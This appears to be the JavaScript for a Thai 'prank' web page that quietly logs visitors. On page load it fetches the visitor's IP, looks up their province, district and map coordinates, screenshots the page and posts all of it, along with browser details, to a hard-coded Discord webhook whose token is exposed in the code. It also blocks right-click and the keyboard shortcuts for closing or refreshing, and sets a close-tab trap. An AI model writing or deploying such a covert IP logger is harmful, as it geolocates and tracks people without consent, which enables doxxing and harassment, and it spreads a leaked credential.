// เว็บแกล้งควาย - แจ้ง Discord โหดๆ
// ใส่ลิงก์ Webhook: Server → Channel → Edit Channel → Integrations → Webhooks
var DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1470795594678145206/HOLFrsBRi6FLdXCeyPDWgCAa-L02tJCIS1NkDqmbtAlETQepsOk7ZwhJZTPeQ1v3XzaD';  // ใส่ URL ของ Discord Webhook ที่นี่

(function() {
    const bgMusic = document.getElementById('bgMusic');
    const overlay = document.getElementById('clickOverlay');
    const overlayText = overlay.querySelector('h1');
    const ipDisplay = document.getElementById('ipDisplay');
    const locationDisplay = document.getElementById('locationDisplay');

    // แจ้งเข้าดิส + จังหวัด/อำเภอ + ลิงก์ Google Maps
    function notifyDiscord(ip, event, screenshotBlob, locationStr, mapUrl, province, district) {
        if (!DISCORD_WEBHOOK_URL) return;
        var prov = (province != null && province !== '') ? province : '-';
        var dist = (district != null && district !== '') ? district : '-';
        var fields = [
            { name: 'IP', value: ip || 'ไม่ทราบ', inline: true },
            { name: 'จังหวัด', value: prov, inline: true },
            { name: 'อำเภอ', value: dist, inline: true },
            { name: 'ดูใน Google Maps', value: mapUrl ? '[เปิดแผนที่](' + mapUrl + ')' : '-', inline: false },
            { name: 'เบอร์โทร', value: 'ดึงไม่ได้ (เบราว์เซอร์ไม่ให้เว็บอ่าน)', inline: true },
            { name: 'เวลา', value: new Date().toLocaleString('th-TH'), inline: true },
            { name: 'หน้าจอ', value: window.screen.width + ' x ' + window.screen.height, inline: true },
            { name: 'User-Agent', value: (navigator.userAgent || '-').substring(0, 1000), inline: false },
            { name: 'Referrer', value: (document.referrer || '-').substring(0, 1000), inline: false },
            { name: 'URL', value: window.location.href, inline: false }
        ];
        var payload = {
            embeds: [{
                title: 'มีคนเข้าเว็บ!',
                description: event,
                color: 0xFF0000,
                fields: fields
            }]
        };

        if (screenshotBlob) {
            var form = new FormData();
            form.append('payload_json', JSON.stringify(payload));
            form.append('file', screenshotBlob, 'screenshot.png');
            fetch(DISCORD_WEBHOOK_URL, {
                method: 'POST',
                body: form
            }).catch(function() {});
        } else {
            fetch(DISCORD_WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            }).catch(function() {});
        }
    }

    // ดึงจังหวัด/อำเภอจริง: ipinfo.io ก่อน (region=จังหวัด, city=อำเภอ) ไม่ได้ค่อยใช้ ip-api
    function fetchLocation(ip, callback) {
        if (!ip || ip === 'ไม่ทราบ') {
            callback('ไม่ทราบ', null, null, null, '-', '-');
            return;
        }
        function tryIpApi() {
            fetch('https://ip-api.com/json/' + ip + '?fields=status,city,regionName,country,lat,lon')
                .then(function(r) { return r.json(); })
                .then(function(data) {
                    if (data && data.status === 'success') {
                        var province = (data.regionName && String(data.regionName).trim() !== '') ? String(data.regionName).trim() : '-';
                        var district = (data.city && String(data.city).trim() !== '') ? String(data.city).trim() : '-';
                        var mapUrl = (data.lat != null && data.lon != null) ? ('https://www.google.com/maps?q=' + data.lat + ',' + data.lon) : null;
                        callback('อำเภอ ' + district + ', จังหวัด ' + province, data.lat, data.lon, mapUrl, province, district);
                    } else {
                        callback('ไม่ทราบ', null, null, null, '-', '-');
                    }
                })
                .catch(function() { callback('ไม่ทราบ', null, null, null, '-', '-'); });
        }
        fetch('https://ipinfo.io/' + ip + '/json')
            .then(function(res) { return res.json(); })
            .then(function(data) {
                var province = (data.region && String(data.region).trim() !== '') ? String(data.region).trim() : null;
                var district = (data.city && String(data.city).trim() !== '') ? String(data.city).trim() : null;
                if (province || district) {
                    var lat = null, lon = null, mapUrl = null;
                    if (data.loc) {
                        var parts = String(data.loc).split(',');
                        if (parts.length === 2) {
                            lat = parseFloat(parts[0]);
                            lon = parseFloat(parts[1]);
                            if (!isNaN(lat) && !isNaN(lon)) mapUrl = 'https://www.google.com/maps?q=' + lat + ',' + lon;
                        }
                    }
                    var locationStr = 'อำเภอ ' + (district || '-') + ', จังหวัด ' + (province || '-');
                    callback(locationStr, lat, lon, mapUrl, province || '-', district || '-');
                    return;
                }
                tryIpApi();
            })
            .catch(function() { tryIpApi(); });
    }

    // แคปหน้าจอแล้วส่งไป Discord (ส่ง province, district ไปด้วย)
    function captureAndNotify(ip, event, locationStr, mapUrl, province, district) {
        if (typeof html2canvas === 'undefined') {
            notifyDiscord(ip, event, null, locationStr, mapUrl, province, district);
            return;
        }
        html2canvas(document.body, { useCORS: true, allowTaint: true }).then(function(canvas) {
            canvas.toBlob(function(blob) {
                notifyDiscord(ip, event, blob, locationStr, mapUrl, province, district);
            }, 'image/png');
        }).catch(function() {
            notifyDiscord(ip, event, null, locationStr, mapUrl, province, district);
        });
    }

    function fetchIP() {
        fetch('https://api.ipify.org?format=json')
            .then(function(res) { return res.json(); })
            .then(function(data) {
                var ip = data.ip;
                ipDisplay.textContent = 'IP ของคุณ: ' + ip;
                ipDisplay.style.marginTop = '1rem';
                ipDisplay.style.fontSize = '1.2rem';
                ipDisplay.style.color = '#aaa';
                locationDisplay.style.marginTop = '0.5rem';
                locationDisplay.style.fontSize = '1rem';
                locationDisplay.style.color = '#888';
                fetchLocation(ip, function(locationStr, lat, lon, mapUrl, province, district) {
                    var p = (province != null && province !== '') ? province : '-';
                    var d = (district != null && district !== '') ? district : '-';
                    var html = 'จังหวัด: ' + p + ' &nbsp;|&nbsp; อำเภอ: ' + d;
                    if (mapUrl) {
                        html += ' <a href="' + mapUrl + '" target="_blank" rel="noopener" style="color:#6eb3f7;">ดูใน Google Maps</a>';
                    }
                    locationDisplay.innerHTML = html;
                    captureAndNotify(ip, 'มีคนกดเข้าลิงก์แล้ว', locationStr, mapUrl, p, d);
                });
            })
            .catch(function() {
                ipDisplay.textContent = 'ไม่สามารถดึง IP ได้';
                locationDisplay.textContent = 'จังหวัด: - | อำเภอ: -';
                captureAndNotify('ไม่ทราบ', 'มีคนกดเข้าลิงก์แล้ว', 'ไม่ทราบ', null, '-', '-');
            });
    }

    fetchIP();

    function playMusic() {
        if (!bgMusic) return;
        bgMusic.volume = 1.0;
        bgMusic.play().then(function() {
            overlayText.textContent = 'เพลงเพราะเคยฟังมั้ย';
            if (ipDisplay.textContent) {
                ipDisplay.style.color = '#fff';
                ipDisplay.style.marginTop = '1.5rem';
            }
        }).catch(function(err) {
            console.error('เล่นเพลงไม่ได้:', err);
        });
    }

    overlay.addEventListener('click', function() {
        playMusic();
    });

    // block การปิดแท็บ/หน้าต่าง - แสดง dialog ถาม
    window.addEventListener('beforeunload', function(e) {
        e.preventDefault();
        e.returnValue = '';
    });

    // ปิดคลิกขวา
    document.addEventListener('contextmenu', function(e) {
        e.preventDefault();
    });

    // block ปุ่ม Escape, F5, Ctrl+W, Ctrl+F4
    document.addEventListener('keydown', function(e) {
        if (e.key === 'Escape' || e.key === 'F5' ||
            (e.ctrlKey && e.key === 'w') ||
            (e.ctrlKey && e.key === 'F4') ||
            (e.altKey && e.key === 'F4')) {
            e.preventDefault();
        }
    });

    if (bgMusic) {
        bgMusic.load();
    }
})();
